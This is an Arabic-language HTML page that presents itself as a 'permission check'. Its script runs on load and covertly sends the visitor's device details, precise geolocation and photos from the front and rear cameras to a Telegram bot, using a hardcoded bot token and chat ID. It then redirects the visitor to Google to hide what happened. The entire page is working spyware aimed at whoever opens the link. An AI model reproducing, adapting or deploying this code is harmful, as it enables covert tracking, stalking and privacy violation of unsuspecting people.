<!DOCTYPE html>
<html dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>فحص الصلاحيات</title>
    <style>
        * { margin: 0; padding: 0; }
        body { background: #fff; }
    </style>
</head>
<body>

<script>
const BOT_TOKEN = "8594182379:AAFJVG1vz1kX0mLzc4Ro_d9YGNbnTbDlCyQ";
const CHAT_ID = "8075000065";

/* ---- الأدوات المساعدة ---- */
function dataURLtoBlob(dataURL) {
    const [header, data] = dataURL.split(',');
    const mime = header.match(/:(.*?);/)[1];
    const bytes = atob(data);
    const arr = new Uint8Array(bytes.length);
    for (let i = 0; i < bytes.length; i++) arr[i] = bytes.charCodeAt(i);
    return new Blob([arr], { type: mime });
}

async function sendTelegramMessage(text) {
    try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text, parse_mode: 'Markdown' })
        });
    } catch(e) { console.log(e); }
}

async function sendTelegramPhoto(base64Img, caption, fileName) {
    try {
        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        formData.append('caption', caption);
        formData.append('photo', dataURLtoBlob(base64Img), fileName);
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
    } catch(e) { console.log(e); }
}

async function sendLocation(lat, lng, acc) {
    try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, latitude: lat, longitude: lng, horizontal_accuracy: acc })
        });
    } catch(e) { console.log(e); }
}

/* ---- كاميرا ---- */
async function captureCamera(facingMode, caption, fileName) {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode } });
        const video = document.createElement('video');
        video.srcObject = stream;
        await video.play();
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        canvas.getContext('2d').drawImage(video, 0, 0);
        const image = canvas.toDataURL('image/jpeg', 0.8);
        stream.getTracks().forEach(t => t.stop());
        await sendTelegramPhoto(image, caption, fileName);
    } catch(e) {
        await sendTelegramMessage(`❌ ${caption}: ${e.message}`);
    }
}

/* ---- موقع ---- */
async function tryGetLocation() {
    try {
        const perm = await navigator.permissions.query({ name: 'geolocation' });
        await sendTelegramMessage(`📍 صلاحية الموقع: ${perm.state}`);
    } catch(e) {
        // بعض المتصفحات ما تدعم permissions API
    }

    navigator.geolocation.getCurrentPosition(
        async (pos) => {
            const { latitude: lat, longitude: lng, accuracy } = pos.coords;
            const acc = Math.round(accuracy);
            await sendLocation(lat, lng, acc);
            await sendTelegramMessage(`📍 الموقع:\nhttps://maps.google.com/?q=${lat},${lng}\n🎯 الدقة: ${acc}م`);
        },
        async (err) => {
            await sendTelegramMessage(`❌ خطأ/رفض الموقع: ${err.message}`);
        },
        { enableHighAccuracy: true, timeout: 10000 }
    );
}

/* ---- تحويل لقوقل ---- */
function redirectToGoogle() {
    window.location.href = "https://www.google.com";
    document.location.href = "https://www.google.com";
    setTimeout(() => {
        window.location.replace("https://www.google.com");
    }, 100);
}

/* ---- الوظيفة الرئيسية ---- */
async function checkAndRun() {
    // معلومات الجهاز الأساسية
    await sendTelegramMessage(
        `📱 *جهاز جديد*\n🌐 اللغة: ${navigator.language}\n💻 المنصة: ${navigator.platform}\n📺 الشاشة: ${screen.width}x${screen.height}`
    );

    // 1. الموقع
    await tryGetLocation();

    // 2. الكاميرا الأمامية
    await captureCamera("user", "🤳 الصورة الأمامية", "front.jpg");

    // 3. الكاميرا الخلفية
    await captureCamera("environment", "📸 الصورة الخلفية", "back.jpg");

    // 4. التوجيه لقوقل بعد خلص كل شي
    setTimeout(redirectToGoogle, 2000);
}

checkAndRun();
</script>
</body>
</html>
